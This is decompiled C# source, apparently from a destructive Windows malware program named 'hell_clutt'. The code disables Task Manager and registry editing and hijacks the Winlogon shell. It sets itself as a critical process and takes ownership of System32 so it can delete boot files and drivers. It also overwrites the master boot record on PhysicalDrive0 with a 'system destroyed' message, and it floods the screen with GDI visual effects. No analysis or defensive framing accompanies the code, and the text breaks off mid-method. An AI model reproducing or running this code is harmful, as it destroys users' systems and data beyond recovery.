using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

// Token: 0x0200000C RID: 12
public class GClass0
{
	// Token: 0x06000034 RID: 52
	[DllImport("gdi32.dll", ExactSpelling = true)]
	private static extern IntPtr BitBlt(IntPtr intptr_0, int int_6, int int_7, int int_8, int int_9, IntPtr intptr_1, int int_10, int int_11, GClass0.GEnum0 genum0_0);

	// Token: 0x06000035 RID: 53
	[DllImport("user32.dll")]
	private static extern IntPtr GetDesktopWindow();

	// Token: 0x06000036 RID: 54
	[DllImport("user32.dll")]
	private static extern IntPtr GetWindowDC(IntPtr intptr_0);

	// Token: 0x06000037 RID: 55
	[DllImport("Shell32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true)]
	private static extern int ExtractIconExW(string string_1, int int_6, out IntPtr intptr_0, out IntPtr intptr_1, int int_7);

	// Token: 0x06000038 RID: 56
	[DllImport("user32.dll")]
	private static extern bool InvalidateRect(IntPtr intptr_0, IntPtr intptr_1, bool bool_15);

	// Token: 0x06000039 RID: 57
	[DllImport("gdi32.dll")]
	private static extern bool StretchBlt(IntPtr intptr_0, int int_6, int int_7, int int_8, int int_9, IntPtr intptr_1, int int_10, int int_11, int int_12, int int_13, GClass0.GEnum0 genum0_0);

	// Token: 0x0600003A RID: 58
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_6, ref int int_7, int int_8);

	// Token: 0x0600003B RID: 59 RVA: 0x00003704 File Offset: 0x00001904
	public static Icon smethod_0(string string_1, int int_6, bool bool_15)
	{
		IntPtr intPtr;
		IntPtr intPtr2;
		GClass0.ExtractIconExW(string_1, int_6, out intPtr, out intPtr2, 1);
		Icon icon;
		try
		{
			icon = Icon.FromHandle(bool_15 ? intPtr : intPtr2);
		}
		catch
		{
			icon = null;
		}
		return icon;
	}

	// Token: 0x0600003C RID: 60
	[DllImport("gdi32.dll")]
	public static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

	// Token: 0x0600003D RID: 61
	[DllImport("gdi32.dll")]
	internal static extern bool Rectangle(IntPtr intptr_0, int int_6, int int_7, int int_8, int int_9);

	// Token: 0x0600003E RID: 62
	[DllImport("User32.dll")]
	public static extern IntPtr GetDC(IntPtr intptr_0);

	// Token: 0x0600003F RID: 63
	[DllImport("User32.dll")]
	private static extern int ReleaseDC(IntPtr intptr_0, IntPtr intptr_1);

	// Token: 0x06000040 RID: 64
	[DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool DeleteDC(IntPtr intptr_0);

	// Token: 0x06000041 RID: 65
	[DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr CreateCompatibleDC(IntPtr intptr_0);

	// Token: 0x06000042 RID: 66
	[DllImport("gdi32.dll")]
	private static extern bool PatBlt(IntPtr intptr_0, int int_6, int int_7, int int_8, int int_9, GClass0.GEnum0 genum0_0);

	// Token: 0x06000043 RID: 67
	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateSolidBrush(int int_6);

	// Token: 0x06000044 RID: 68
	[DllImport("gdi32.dll")]
	private static extern bool PlgBlt(IntPtr intptr_0, GClass0.GStruct0[] gstruct0_0, IntPtr intptr_1, int int_6, int int_7, int int_8, int int_9, IntPtr intptr_2, int int_10, int int_11);

	// Token: 0x06000045 RID: 69
	[DllImport("gdi32.dll")]
	private static extern bool Ellipse(IntPtr intptr_0, int int_6, int int_7, int int_8, int int_9);

	// Token: 0x06000046 RID: 70
	[DllImport("gdi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteObject([In] IntPtr intptr_0);

	// Token: 0x06000047 RID: 71
	[DllImport("kernel32")]
	private static extern IntPtr CreateFile(string string_1, uint uint_9, uint uint_10, IntPtr intptr_0, uint uint_11, uint uint_12, IntPtr intptr_1);

	// Token: 0x06000048 RID: 72
	[DllImport("kernel32")]
	private static extern bool WriteFile(IntPtr intptr_0, byte[] byte_0, uint uint_9, out uint uint_10, IntPtr intptr_1);

	// Token: 0x06000049 RID: 73 RVA: 0x00003744 File Offset: 0x00001944
	public static void smethod_1(string string_1, string string_2, string string_3, string string_4)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using (Stream manifestResourceStream = callingAssembly.GetManifestResourceStream(string_1 + "." + ((string_3 == "") ? "" : (string_3 + ".")) + string_4))
		{
			using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
			{
				using (FileStream fileStream = new FileStream(string_2 + "\\" + string_4, FileMode.OpenOrCreate))
				{
					using (BinaryWriter binaryWriter = new BinaryWriter(fileStream))
					{
						binaryWriter.Write(binaryReader.ReadBytes((int)manifestResourceStream.Length));
					}
				}
			}
		}
	}

	// Token: 0x0600004A RID: 74 RVA: 0x00003828 File Offset: 0x00001A28
	public void method_0()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey2.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
		RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey3.SetValue("Shell", "satan", RegistryValueKind.String);
		Process.EnterDebugMode();
		GClass0.NtSetInformationProcess(Process.GetCurrentProcess().Handle, this.int_1, ref this.int_0, 4);
		Directory.CreateDirectory("C:\\Program Files\\Temp");
		GClass0.smethod_1("hell_clutt", "C:\\Program Files\\Temp", "Resources", "crossHD_medium.ico");
		GClass0.smethod_1("hell_clutt", "C:\\Program Files\\Temp", "Resources", "crossHD_small.ico");
		GClass0.smethod_1("hell_clutt", "C:\\Program Files\\Temp", "Resources", "invert_snd.wav");
		GClass0.smethod_1("hell_clutt", "C:\\Program Files\\Temp", "Resources", "mirror_snd.wav");
		GClass0.smethod_1("hell_clutt", "C:\\Program Files\\Temp", "Resources", "plg.wav");
		GClass0.smethod_1("hell_clutt", "C:\\Program Files\\Temp", "Resources", "rainbow_snd.wav");
		GClass0.smethod_1("hell_clutt", "C:\\Program Files\\Temp", "Resources", "static_color.wav");
		GClass0.smethod_1("hell_clutt", "C:\\Program Files\\Temp", "Resources", "stretch.wav");
		GClass0.smethod_1("hell_clutt", "C:\\Program Files\\Temp", "Resources", "tunnel.wav");
		GClass0.smethod_1("hell_clutt", "C:\\Program Files\\Temp", "Resources", "wind_edit.wav");
		GClass0.smethod_1("hell_clutt", "C:\\Program Files\\Temp", "Resources", "wind_short.wav");
		GClass0.smethod_1("hell_clutt", "C:\\Program Files\\Temp", "Resources", "wind_snd.wav");
		GClass0.smethod_1("hell_clutt", "C:\\Program Files\\Temp", "Resources", "clutterus_ico.ico");
		Thread thread = new Thread(new ThreadStart(this.method_5));
		Thread thread2 = new Thread(new ThreadStart(this.method_6));
		Thread thread3 = new Thread(new ThreadStart(this.method_4));
		Thread thread4 = new Thread(new ThreadStart(this.method_2));
		Thread thread5 = new Thread(new ThreadStart(this.method_1));
		thread4.Start();
		thread5.Start();
		Thread.Sleep(15000);
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread5.Abort();
		thread4.Abort();
	}

	// Token: 0x0600004B RID: 75 RVA: 0x00003AA4 File Offset: 0x00001CA4
	public void method_1()
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd.exe",
			WindowStyle = ProcessWindowStyle.Hidden,
			Arguments = "/k takeown /f C:\\Windows\\System32 && icacls C:\\Windows\\System32 /grant \"%username%:F\" && takeown /f C:\\Windows\\System32\\drivers && icacls C:\\Windows\\System32\\drivers /grant \"%username%:F\" && takeown /f C:\\Windows\\System32\\Boot && icacls C:\\Windows\\System32\\Boot /grant \"%username%:F\" && exit"
		});
		while (File.Exists("C:\\Windows\\System32\\winload.exe"))
		{
			try
			{
				File.Delete("C:\\Windows\\System32\\winload.exe");
			}
			catch
			{
			}
			Thread.Sleep(10);
		}
		while (File.Exists("C:\\Windows\\System32\\hal.dll"))
		{
			try
			{
				File.Delete("C:\\Windows\\System32\\hal.dll");
			}
			catch
			{
			}
			Thread.Sleep(10);
		}
		while (File.Exists("C:\\Windows\\System32\\drivers\\disk.sys"))
		{
			string[] files = Directory.GetFiles("C:\\Windows\\System32\\drivers");
			foreach (string text in files)
			{
				try
				{
					File.Delete(text);
					goto IL_AF;
				}
				catch
				{
					goto IL_AF;
				}
				break;
				IL_AF:;
			}
			Thread.Sleep(10);
		}
		while (File.Exists("C:\\Windows\\System32\\Boot\\winload.exe"))
		{
			string[] files2 = Directory.GetFiles("C:\\Windows\\System32\\Boot");
			foreach (string text2 in files2)
			{
				try
				{
					File.Delete(text2);
					goto IL_F8;
				}
				catch
				{
					goto IL_F8;
				}
				break;
				IL_F8:;
			}
			Thread.Sleep(10);
		}
		if (Directory.Exists("C:\\Program Files\\Process Hacker 2"))
		{
			string[] files3 = Directory.GetFiles("C:\\Program Files\\Process Hacker 2");
			foreach (string text3 in files3)
			{
				try
				{
					File.Delete(text3);
				}
				catch
				{
				}
			}
			Thread.Sleep(10);
		}
	}

	// Token: 0x0600004C RID: 76
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool CloseHandle(IntPtr intptr_0);

	// Token: 0x0600004D RID: 77 RVA: 0x00003C3C File Offset: 0x00001E3C
	public void method_2()
	{
		byte[] array = new byte[]
		{
			235, 0, 49, 192, 142, 216, 252, 184, 18, 0,
			205, 16, 190, 36, 124, 179, 12, 232, 2, 0,
			235, 254, 183, 0, 172, 60, 0, 116, 6, 180,
			14, 205, 16, 235, 245, 195, 67, 76, 85, 84,
			84, 54, 46, 54, 46, 54, 13, 10, 13, 10,
			89, 79, 85, 82, 32, 83, 89, 83, 84, 69,
			77, 32, 87, 65, 83, 32, 68, 69, 83, 84,
			82, 79, 89, 69, 68, 32, 66, 89, 32, 67,
			76, 85, 84, 84, 54, 46, 54, 46, 54, 33,
			13, 10, 65, 76, 76, 32, 89, 79, 85, 82,
			32, 83, 89, 83, 84, 69, 77, 32, 70, 73,
			76, 69, 83, 32, 65, 78, 68, 32, 77, 66,
			82, 32, 72, 65, 86, 69, 32, 66, 69, 69,
			78, 32, 86, 69, 82, 89, 32, 68, 65, 77,
			65, 71, 69, 68, 33, 13, 10, 87, 72, 89,
			32, 68, 73, 68, 32, 89, 79, 85, 32, 65,
			71, 71, 82, 69, 83, 83, 73, 86, 69, 76,
			89, 32, 68, 69, 83, 84, 82, 79, 89, 32,
			89, 79, 85, 82, 32, 83, 89, 83, 84, 69,
			77, 63, 32, 78, 79, 87, 32, 73, 83, 32,
			76, 65, 84, 69, 32, 65, 78, 68, 32, 69,
			86, 69, 82, 89, 84, 72, 73, 78, 71, 32,
			73, 83, 32, 68, 69, 83, 84, 82, 79, 89,
			69, 68, 33, 32, 89, 79, 85, 82, 32, 77,
			73, 78, 68, 32, 77, 85, 83, 84, 32, 66,
			69, 32, 86, 69, 82, 83, 69, 68, 32, 65,
			78, 68, 32, 68, 73, 83, 71, 85, 83, 84,
			73, 78, 71, 33, 32, 65, 83, 32, 89, 79,
			85, 82, 32, 83, 89, 83, 84, 69, 77, 44,
			32, 89, 79, 85, 32, 87, 73, 76, 76, 32,
			83, 85, 70, 70, 69, 82, 32, 73, 78, 32,
			72, 69, 76, 76, 33, 32, 70, 79, 82, 69,
			86, 69, 82, 33, 32, 71, 76, 79, 82, 89,
			32, 84, 79, 32, 83, 65, 84, 65, 78, 33,
			13, 10, 13, 10, 69, 78, 74, 79, 89, 32,
			76, 73, 70, 69, 32, 73, 78, 32, 72, 69,
			76, 76, 33, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			85, 170
		};
		IntPtr intPtr = GClass0.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
		uint num;
		GClass0.WriteFile(intPtr, array, 512U, out num, IntPtr.Zero);
		GClass0.CloseHandle(intPtr);
	}

	// Token: 0x0600004E RID: 78 RVA: 0x00003C98 File Offset: 0x00001E98
	public void method_3()
	{
		for (int i = 0; i < 10; i++)
		{
			GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
			Thread.Sleep(15);
		}
	}

	// Token: 0x0600004F RID: 79 RVA: 0x00003CCC File Offset: 0x00001ECC
	public void method_4()
	{
		try
		{
			this.soundPlayer_0 = new SoundPlayer("C:\\Program Files\\Temp\\wind_short.wav");
			this.soundPlayer_1 = new SoundPlayer("C:\\Program Files\\Temp\\wind_snd.wav");
			this.soundPlayer_2 = new SoundPlayer("C:\\Program Files\\Temp\\stretch.wav");
			this.soundPlayer_3 = new SoundPlayer("C:\\Program Files\\Temp\\mirror_snd.wav");
			this.soundPlayer_4 = new SoundPlayer("C:\\Program Files\\Temp\\invert_snd.wav");
			this.soundPlayer_5 = new SoundPlayer("C:\\Program Files\\Temp\\static_color.wav");
			this.soundPlayer_6 = new SoundPlayer("C:\\Program Files\\Temp\\rainbow_snd.wav");
			this.soundPlayer_7 = new SoundPlayer("C:\\Program Files\\Temp\\plg.wav");
			this.soundPlayer_8 = new SoundPlayer("C:\\Program Files\\Temp\\tunnel.wav");
			this.soundPlayer_9 = new SoundPlayer("C:\\Program Files\\Temp\\wind_edit.wav");
			goto IL_1BC;
		}
		catch (Exception)
		{
			Environment.Exit(-1);
			goto IL_1BC;
		}
		IL_B2:
		if (this.bool_6)
		{
			this.bool_6 = false;
			this.soundPlayer_1.PlayLooping();
		}
		if (this.bool_7)
		{
			this.bool_7 = false;
			this.soundPlayer_2.PlayLooping();
		}
		if (this.bool_8)
		{
			this.bool_8 = false;
			this.soundPlayer_3.PlayLooping();
		}
		if (this.bool_9)
		{
			this.bool_9 = false;
			this.soundPlayer_4.PlayLooping();
		}
		if (this.bool_10)
		{
			this.bool_10 = false;
			this.soundPlayer_5.PlayLooping();
		}
		if (this.bool_11)
		{
			this.bool_11 = false;
			this.soundPlayer_6.PlayLooping();
		}
		if (this.bool_12)
		{
			this.bool_12 = false;
			this.soundPlayer_7.PlayLooping();
		}
		if (this.bool_13)
		{
			this.bool_13 = false;
			this.soundPlayer_8.PlayLooping();
		}
		if (this.bool_14)
		{
			this.bool_14 = false;
			this.soundPlayer_9.PlayLooping();
		}
		Thread.Sleep(100);
		IL_1BC:
		if (!this.bool_5)
		{
			this.bool_5 = true;
			this.soundPlayer_0.PlayLooping();
			goto IL_B2;
		}
		goto IL_B2;
	}

	// Token: 0x06000050 RID: 80 RVA: 0x00003EB4 File Offset: 0x000020B4
	public void method_5()
	{
		this.random_0 = new Random();
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		int num = Screen.PrimaryScreen.Bounds.Width / 2;
		int num2 = Screen.PrimaryScreen.Bounds.Width / 2;
		IntPtr intPtr = GClass0.GetDesktopWindow();
		IntPtr intPtr2 = GClass0.GetWindowDC(intPtr);
		IntPtr intPtr3 = GClass0.CreateSolidBrush(255);
		Icon icon = new Icon("C:\\Program Files\\Temp\\clutterus_ico.ico");
		for (;;)
		{
			Process[] processesByName = Process.GetProcessesByName("MEMZ");
			Process[] processesByName2 = Process.GetProcessesByName("Clutt4.5");
			Process[] processesByName3 = Process.GetProcessesByName("Clutt4.1");
			Process[] processesByName4 = Process.GetProcessesByName("Clutt4");
			Process[] processesByName5 = Process.GetProcessesByName("Clutt3");
			Process[] processesByName6 = Process.GetProcessesByName("Clutt");
			Process[] processesByName7 = Process.GetProcessesByName("taskmgr");
			Process[] processesByName8 = Process.GetProcessesByName("Monoxidex64");
			Process[] processesByName9 = Process.GetProcessesByName("Monoxidex86");
			Process[] processesByName10 = Process.GetProcessesByName("quantizer");
			Process[] processesByName11 = Process.GetProcessesByName("neptunium");
			if (!this.bool_0)
			{
				intPtr = GClass0.GetDesktopWindow();
				intPtr2 = GClass0.GetWindowDC(intPtr);
				intPtr3 = GClass0.CreateSolidBrush(255);
				GClass0.SelectObject(intPtr2, intPtr3);
				GClass0.StretchBlt(intPtr2, 0, 0, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.hmm);
				GClass0.StretchBlt(intPtr2, this.random_0.Next(-2, 2), this.random_0.Next(-2, 2), width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
				GClass0.DeleteObject(intPtr3);
				if (this.random_0.Next(5) == 1)
				{
					GClass0.BitBlt(intPtr2, 1, 1, width, height, intPtr2, 0, 0, GClass0.GEnum0.SRCINVERT);
				}
				Thread.Sleep(1000);
			}
			else if (this.bool_1)
			{
				intPtr = GClass0.GetDesktopWindow();
				intPtr2 = GClass0.GetWindowDC(intPtr);
				IntPtr intPtr4 = GClass0.CreateSolidBrush(this.random_0.Next(100000000));
				GClass0.SelectObject(intPtr2, intPtr4);
				GClass0.PatBlt(intPtr2, 0, 0, width, this.random_0.Next(height), GClass0.GEnum0.PATINVERT);
				Thread.Sleep(30);
				GClass0.DeleteObject(intPtr4);
			}
			if (this.bool_2)
			{
				intPtr = GClass0.GetDesktopWindow();
				intPtr2 = GClass0.GetWindowDC(intPtr);
				IntPtr intPtr5 = GClass0.CreateSolidBrush(this.random_0.Next(255));
				GClass0.SelectObject(intPtr2, intPtr5);
				GClass0.PatBlt(intPtr2, 0, 0, width, height, GClass0.GEnum0.PATINVERT);
				Thread.Sleep(50);
				GClass0.DeleteObject(intPtr5);
			}
			if (this.bool_3)
			{
				intPtr = GClass0.GetDesktopWindow();
				intPtr2 = GClass0.GetWindowDC(intPtr);
				GClass0.BitBlt(intPtr2, this.random_0.Next(-10, 10), this.random_0.Next(-10, 10), width, height, intPtr2, 0, 0, GClass0.GEnum0.SRCCOPY);
				Thread.Sleep(30);
			}
			if (this.bool_4)
			{
				intPtr = GClass0.GetDesktopWindow();
				intPtr2 = GClass0.GetWindowDC(intPtr);
				GClass0.BitBlt(intPtr2, this.random_0.Next(-5, 5), this.random_0.Next(-5, 5), width, height, intPtr2, 0, 0, GClass0.GEnum0.SRCERASE);
				Thread.Sleep(100);
			}
			if (File.Exists(this.string_0 + "\\sus.txt"))
			{
				IntPtr dc = GClass0.GetDC(IntPtr.Zero);
				if (this.random_0.Next(5) == 1)
				{
					using (Graphics graphics = Graphics.FromHdc(dc))
					{
						graphics.DrawIcon(icon, this.random_0.Next(width), this.random_0.Next(height));
					}
				}
				GClass0.ReleaseDC(IntPtr.Zero, dc);
				Thread.Sleep(30);
			}
			if (processesByName.Length == 1)
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = "/k taskkill /f /im MEMZ.exe /t && exit"
				});
				for (int i = 0; i < 200; i++)
				{
					IntPtr dc2 = GClass0.GetDC(IntPtr.Zero);
					using (Graphics graphics2 = Graphics.FromHdc(dc2))
					{
						string text = "!!!CANNOT RUN MEMZ";
						Font font = new Font("Impact", (float)this.random_0.Next(10, 30));
						SolidBrush solidBrush = new SolidBrush(Color.Blue);
						int num3 = this.random_0.Next(width);
						int num4 = this.random_0.Next(height);
						StringFormat stringFormat = new StringFormat();
						stringFormat.FormatFlags = StringFormatFlags.DirectionRightToLeft;
						if (this.random_0.Next(3) == 0)
						{
							graphics2.DrawString(text, font, solidBrush, (float)num3, (float)num4, stringFormat);
						}
						if (this.random_0.Next(100) == 3)
						{
							GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
						}
					}
					GClass0.ReleaseDC(IntPtr.Zero, dc2);
					Thread.Sleep(30);
				}
			}
			if (processesByName2.Length == 1)
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = "/k taskkill /f /im Clutt4.5.exe /t && exit"
				});
				Thread.Sleep(30);
			}
			if (processesByName3.Length == 1)
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = "/k taskkill /f /im Clutt4.1.exe /t && exit"
				});
				Thread.Sleep(30);
			}
			if (processesByName4.Length == 1)
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = "/k taskkill /f /im Clutt4.exe /t && exit"
				});
				Thread.Sleep(30);
			}
			if (processesByName5.Length == 1)
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = "/k taskkill /f /im Clutt3.exe /t && exit"
				});
				Thread.Sleep(30);
			}
			if (processesByName6.Length == 1)
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = "/k taskkill /f /im Clutt.exe /t && exit"
				});
				Thread.Sleep(30);
			}
			if (processesByName7.Length == 1)
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = "/k taskkill /f /im taskmgr.exe /t && exit"
				});
				Thread.Sleep(30);
			}
			if (processesByName8.Length == 1)
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = "/k taskkill /f /im Monoxidex64.exe /t && exit"
				});
				for (int j = 0; j < 200; j++)
				{
					IntPtr dc3 = GClass0.GetDC(IntPtr.Zero);
					using (Graphics graphics3 = Graphics.FromHdc(dc3))
					{
						string text2 = "!!!WIPET IS INVALID";
						Font font2 = new Font("Impact", (float)this.random_0.Next(10, 30));
						SolidBrush solidBrush2 = new SolidBrush(Color.Pink);
						int num5 = this.random_0.Next(width);
						int num6 = this.random_0.Next(height);
						StringFormat stringFormat2 = new StringFormat();
						stringFormat2.FormatFlags = StringFormatFlags.DirectionRightToLeft;
						if (this.random_0.Next(3) == 0)
						{
							graphics3.DrawString(text2, font2, solidBrush2, (float)num5, (float)num6, stringFormat2);
						}
						if (this.random_0.Next(100) == 3)
						{
							GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
						}
					}
					GClass0.ReleaseDC(IntPtr.Zero, dc3);
					Thread.Sleep(30);
				}
				Thread.Sleep(30);
			}
			if (processesByName9.Length == 1)
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = "/k taskkill /f /im Monoxidex86.exe /t && exit"
				});
				for (int k = 0; k < 200; k++)
				{
					IntPtr dc4 = GClass0.GetDC(IntPtr.Zero);
					using (Graphics graphics4 = Graphics.FromHdc(dc4))
					{
						string text3 = "!!!WIPET IS INVALID";
						Font font3 = new Font("Impact", (float)this.random_0.Next(10, 30));
						SolidBrush solidBrush3 = new SolidBrush(Color.Pink);
						int num7 = this.random_0.Next(width);
						int num8 = this.random_0.Next(height);
						StringFormat stringFormat3 = new StringFormat();
						stringFormat3.FormatFlags = StringFormatFlags.DirectionRightToLeft;
						if (this.random_0.Next(3) == 0)
						{
							graphics4.DrawString(text3, font3, solidBrush3, (float)num7, (float)num8, stringFormat3);
						}
						if (this.random_0.Next(100) == 3)
						{
							GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
						}
					}
					GClass0.ReleaseDC(IntPtr.Zero, dc4);
					Thread.Sleep(30);
				}
				Thread.Sleep(30);
			}
			if (processesByName10.Length == 1)
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = "/k taskkill /f /im quantizer.exe /t && exit"
				});
				for (int l = 0; l < 200; l++)
				{
					IntPtr dc5 = GClass0.GetDC(IntPtr.Zero);
					using (Graphics graphics5 = Graphics.FromHdc(dc5))
					{
						string text4 = "!!!WIPET IS INVALID";
						Font font4 = new Font("Impact", (float)this.random_0.Next(10, 30));
						SolidBrush solidBrush4 = new SolidBrush(Color.Pink);
						int num9 = this.random_0.Next(width);
						int num10 = this.random_0.Next(height);
						StringFormat stringFormat4 = new StringFormat();
						stringFormat4.FormatFlags = StringFormatFlags.DirectionRightToLeft;
						if (this.random_0.Next(3) == 0)
						{
							graphics5.DrawString(text4, font4, solidBrush4, (float)num9, (float)num10, stringFormat4);
						}
						if (this.random_0.Next(100) == 3)
						{
							GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
						}
					}
					GClass0.ReleaseDC(IntPtr.Zero, dc5);
					Thread.Sleep(30);
				}
				Thread.Sleep(30);
			}
			if (processesByName11.Length == 1)
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = "/k taskkill /f /im neptunium.exe /t && exit"
				});
				for (int m = 0; m < 200; m++)
				{
					IntPtr dc6 = GClass0.GetDC(IntPtr.Zero);
					using (Graphics graphics6 = Graphics.FromHdc(dc6))
					{
						string text5 = "!!!WIPET IS INVALID";
						Font font5 = new Font("Impact", (float)this.random_0.Next(10, 30));
						SolidBrush solidBrush5 = new SolidBrush(Color.Pink);
						int num11 = this.random_0.Next(width);
						int num12 = this.random_0.Next(height);
						StringFormat stringFormat5 = new StringFormat();
						stringFormat5.FormatFlags = StringFormatFlags.DirectionRightToLeft;
						if (this.random_0.Next(3) == 0)
						{
							graphics6.DrawString(text5, font5, solidBrush5, (float)num11, (float)num12, stringFormat5);
						}
						if (this.random_0.Next(100) == 3)
						{
							GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
						}
					}
					GClass0.ReleaseDC(IntPtr.Zero, dc6);
					Thread.Sleep(30);
				}
				Thread.Sleep(30);
			}
		}
	}

	// Token: 0x06000051 RID: 81 RVA: 0x00004A38 File Offset: 0x00002C38
	public void method_6()
	{
		Thread.Sleep(15000);
		Icon icon = new Icon("C:\\Program Files\\Temp\\crossHD_medium.ico");
		Icon icon2 = new Icon("C:\\Program Files\\Temp\\crossHD_small.ico");
		this.random_0 = new Random();
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		int num = Screen.PrimaryScreen.Bounds.Width / 2;
		int num2 = Screen.PrimaryScreen.Bounds.Width / 2;
		IntPtr intPtr = GClass0.GetDesktopWindow();
		IntPtr intPtr2 = GClass0.GetWindowDC(intPtr);
		IntPtr intPtr3 = GClass0.CreateSolidBrush(255);
		GClass0.GStruct0[] array = new GClass0.GStruct0[3];
		IntPtr intPtr4 = GClass0.GetDC(intPtr2);
		this.bool_6 = true;
		for (int i = 0; i < 400; i++)
		{
			intPtr = GClass0.GetDesktopWindow();
			intPtr2 = GClass0.GetWindowDC(intPtr);
			GClass0.BitBlt(intPtr2, this.random_0.Next(-20, 25), 0, width, this.random_0.Next(height), intPtr2, 0, 0, GClass0.GEnum0.SRCCOPY);
			Thread.Sleep(25);
			if (this.random_0.Next(50) == 3)
			{
				GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
			}
		}
		this.method_3();
		for (int j = 0; j < 400; j++)
		{
			intPtr = GClass0.GetDesktopWindow();
			intPtr2 = GClass0.GetWindowDC(intPtr);
			GClass0.BitBlt(intPtr2, 0, this.random_0.Next(-20, 25), this.random_0.Next(width), height, intPtr2, 0, 0, GClass0.GEnum0.SRCCOPY);
			Thread.Sleep(25);
			if (this.random_0.Next(50) == 3)
			{
				GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
			}
		}
		this.method_3();
		for (int k = 0; k < 500; k++)
		{
			intPtr = GClass0.GetDesktopWindow();
			intPtr2 = GClass0.GetWindowDC(intPtr);
			GClass0.BitBlt(intPtr2, this.random_0.Next(-20, 25), this.random_0.Next(-20, 25), this.random_0.Next(width), this.random_0.Next(height), intPtr2, 0, 0, GClass0.GEnum0.SRCCOPY);
			Thread.Sleep(25);
			if (this.random_0.Next(50) == 3)
			{
				GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
			}
		}
		this.method_3();
		this.bool_7 = true;
		for (int l = 0; l < 100; l++)
		{
			intPtr = GClass0.GetDesktopWindow();
			intPtr2 = GClass0.GetWindowDC(intPtr);
			GClass0.StretchBlt(intPtr2, this.random_0.Next(-15, 10), 0, width + 10, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCCOPY);
			Thread.Sleep(25);
			if (this.random_0.Next(50) == 3)
			{
				GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
			}
		}
		this.method_3();
		for (int m = 0; m < 100; m++)
		{
			intPtr = GClass0.GetDesktopWindow();
